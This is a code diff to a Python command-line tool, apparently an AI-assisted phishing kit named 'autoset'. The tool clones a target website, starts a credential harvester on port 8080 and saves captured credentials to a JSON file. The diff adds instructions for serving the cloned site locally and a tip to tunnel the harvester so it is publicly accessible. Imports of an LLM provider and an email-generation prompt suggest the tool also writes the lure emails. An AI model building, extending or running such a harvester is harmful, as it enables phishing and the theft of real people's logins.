@@ -7,6 +7,7 @@ import sys
 import argparse
 import logging
 from pathlib import Path
+from urllib.parse import urlparse
 
 from autoset.core.llm_provider import LLMProvider
 from autoset.core.prompts import SE_SYSTEM_PROMPT, EMAIL_GENERATION_PROMPT
@@ -118,6 +119,11 @@ def main():
                 if result["success"]:
                     print(f"✅ Website cloned to {result['path']}")
                     
+                    # Find the cloned site directory
+                    parsed = urlparse(url)
+                    domain = parsed.netloc
+                    site_dir = Path(result['path']) / domain
+                    
                     # Start harvester
                     print(f"🚀 Starting credential harvester on port 8080...")
                     harvester = start_harvester(
@@ -128,7 +134,16 @@ def main():
                     
                     print(f"✅ Harvester running on http://localhost:8080")
                     print(f"📊 Captured credentials will be saved to: {workspace / 'harvested_creds.json'}")
-                    print(f"\n💡 Tip: Use /tunnel 8080 to make it publicly accessible")
+                    
+                    # Serve the cloned site
+                    if site_dir.exists():
+                        print(f"\n📂 Serving cloned site from: {site_dir}")
+                        print(f"💡 To serve the cloned site, run in another terminal:")
+                        print(f"   cd {site_dir}")
+                        print(f"   python3 -m http.server 8081")
+                        print(f"   Then visit: http://localhost:8081")
+                    
+                    print(f"\n💡 Tip: Use /tunnel 8080 to make harvester publicly accessible")
                 else:
                     print(f"❌ Clone failed: {result.get('error')}")
             
